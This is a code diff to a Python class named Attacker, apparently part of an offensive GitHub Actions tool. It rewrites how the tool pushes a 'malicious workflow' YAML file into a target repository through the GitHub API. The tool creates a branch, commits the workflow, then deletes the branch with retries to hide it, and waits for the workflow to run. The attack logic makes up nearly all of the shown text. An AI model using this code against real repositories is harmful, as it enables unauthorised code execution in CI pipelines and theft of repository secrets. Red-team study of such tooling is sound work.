@@ -239,15 +239,6 @@ class Attacker:
                     f" the user: {Output.bright(self.user_perms['user'])}!"
             )
 
-            cloned_repo = Git(
-                self.api.pat,
-                target_repo,
-                proxies=self.api.proxies,
-                username=self.author_name,
-                email=self.author_email
-            )
-            cloned_repo.perform_clone()
-
             # Randomly generate a branch name, since this will run immediately
             # otherwise it will fail at the push.
             if target_branch is None:
@@ -272,25 +263,32 @@ class Attacker:
                     payload, branch
                 )
 
-            rev_hash = cloned_repo.commit_file(
-                yaml_contents.encode(),
+            branch_created = self.api.create_branch(target_repo, branch)
+
+            if not branch_created:
+                Output.error("Failed to create branch!")
+                return False
+
+            rev_hash = self.api.commit_file(
+                target_repo,
+                branch,
                 f".github/workflows/{yaml_name}.yml",
+                yaml_contents.encode(),
                 message=commit_message
             )
 
-            if rev_hash is None:
-                Output.error("Failed to commit the malicious workflow locally!")
-                return
-
-            status = cloned_repo.push_repository(branch)
-
-            if not status:
+            if not rev_hash:
                 Output.error("Failed to push the malicious workflow!")
                 return
 
             Output.result("Succesfully pushed the malicious workflow!")
 
-            ret = cloned_repo.delete_branch(branch)
+            for i in range(self.timeout):
+                ret = self.api.delete_branch(target_repo, branch)
+                if ret:
+                    break
+                else:
+                    time.sleep(1)
 
             if ret:
                 Output.result("Malicious branch deleted.")
@@ -300,7 +298,9 @@ class Attacker:
             Output.tabbed("Waiting for the workflow to queue...")
 
             for i in range(self.timeout):
-                workflow_id = self.api.get_recent_workflow(target_repo, rev_hash)
+                workflow_id = self.api.get_recent_workflow(
+                    target_repo, rev_hash
+                )
                 if workflow_id == -1:
                     Output.error("Failed to find the created workflow!")
                     return
